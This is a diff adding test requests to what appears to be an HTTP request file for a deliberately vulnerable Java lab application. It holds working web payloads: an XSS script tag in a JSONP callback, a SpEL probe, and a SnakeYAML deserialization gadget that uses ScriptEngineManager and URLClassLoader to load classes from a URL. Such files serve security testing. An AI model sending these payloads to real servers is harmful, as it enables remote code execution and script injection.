@@ -15,3 +15,10 @@ GET http://localhost:80/api/jsonp/bad01?callback=<script>alert(1)</script>
 
 ###
 GET http://localhost:80/api/spel/bad01?cmd=vulnhere
+
+###
+GET http://localhost:80/api/yaml/bad01?payload=!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "  + "[[!!java.net.URL [\"http://localhost\"]]]]
+
+
+###
+GET http://localhost:80/api/scriptengine/bad01?payload=xx
